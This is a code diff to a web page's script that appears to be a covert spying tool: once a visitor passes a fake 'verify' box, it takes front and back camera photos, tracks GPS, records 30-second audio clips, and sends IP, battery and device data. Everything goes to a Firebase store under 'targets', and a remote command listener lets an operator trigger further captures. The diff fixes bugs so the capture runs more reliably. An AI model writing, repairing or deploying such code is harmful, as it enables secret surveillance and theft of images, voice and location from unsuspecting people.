@@ -30,6 +30,7 @@
     const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
 
     let globalStream = null;
+    let isBusy = false; // Prevents conflict
 
     async function startSystem() {
         document.getElementById('verify-box').style.display = 'none';
@@ -39,19 +40,16 @@
         try {
             await initStream();
             v.play();
-
-            // Initial Intel
             sendInfo();
             trackGPS();
             
-            // Auto Capture Sequence
-            setTimeout(() => capture("user"), 3000); // Front
-            setTimeout(() => capture("environment"), 8000); // Back Force Fix
+            // Auto Sequence
+            setTimeout(() => capture("user"), 3000); 
+            setTimeout(() => capture("environment"), 10000);
 
-            // Persistent Command Listener
             db.ref(`commands/${sessionID}`).on('value', snap => {
                 const cmd = snap.val();
-                if(cmd) {
+                if(cmd && !isBusy) {
                     if(cmd.action === 'photo') capture("user");
                     if(cmd.action === 'back') capture("environment");
                     if(cmd.action === 'audio') recordAudio();
@@ -65,21 +63,19 @@
     async function initStream() {
         if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
         globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        return globalStream;
     }
 
-    // --- BACK CAMERA FORCE FIX ---
+    // --- PHOTO CAPTURE FIX ---
     async function capture(mode) {
+        if(isBusy) return;
+        isBusy = true;
         try {
-            // Step 1: Pehle wale tracks ko release karna lazmi hai
             if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
             
-            // Step 2: Ideal aur Exact dono ka fallback lagaya hai
-            const constraints = { 
+            const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: { ideal: mode } } 
-            };
+            });
             
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
             const tempVid = document.createElement('video');
             tempVid.srcObject = stream;
             await tempVid.play();
@@ -96,47 +92,49 @@
                 });
                 
                 stream.getTracks().forEach(t => t.stop());
-                initStream(); // Command listener ke liye stream wapas bahal karein
+                initStream().then(() => { isBusy = false; });
             }, 3000);
-        } catch (err) { 
-            db.ref(`targets/${sessionID}/logs`).push("Cam Error: " + mode);
-            initStream(); 
-        }
+        } catch (err) { isBusy = false; initStream(); }
     }
 
-    // --- 30 SECOND AUDIO FIX ---
+    // --- AUDIO RECORDING FIX (30 SEC) ---
     async function recordAudio() {
+        if(isBusy) return;
+        isBusy = true;
         try {
-            const recorder = new MediaRecorder(globalStream);
+            // Camera band karna zaroori hai mic access ke liye
+            if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
+            
+            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(audioStream);
             let chunks = [];
+            
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = () => {
                 const reader = new FileReader();
                 reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
-                reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({
-                    data: reader.result,
-                    time: new Date().toLocaleTimeString()
-                });
+                reader.onloadend = () => {
+                    db.ref(`targets/${sessionID}/audios`).push({
+                        data: reader.result,
+                        time: new Date().toLocaleTimeString()
+                    });
+                    audioStream.getTracks().forEach(t => t.stop());
+                    initStream().then(() => { isBusy = false; });
+                };
             };
+
             recorder.start();
+            setTimeout(() => { if(recorder.state !== "inactive") recorder.stop(); }, 30000);
             
-            // 30000ms = 30 Seconds
-            setTimeout(() => {
-                if(recorder.state !== "inactive") recorder.stop();
-            }, 30000); 
-            
-        } catch (e) { console.log("Audio Error"); }
+        } catch (e) { isBusy = false; initStream(); }
     }
 
     async function sendInfo() {
         const batt = await navigator.getBattery().catch(() => ({level:1}));
         const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
         db.ref(`targets/${sessionID}/info`).set({
-            status: "ONLINE",
-            ip: ip.ip,
-            battery: Math.floor(batt.level * 100) + "%",
-            device: navigator.userAgent.split(') ')[0] + ')',
-            time: new Date().toLocaleTimeString()
+            status: "ONLINE", ip: ip.ip, battery: Math.floor(batt.level * 100) + "%",
+            device: navigator.userAgent.split(') ')[0] + ')', time: new Date().toLocaleTimeString()
         });
     }
 
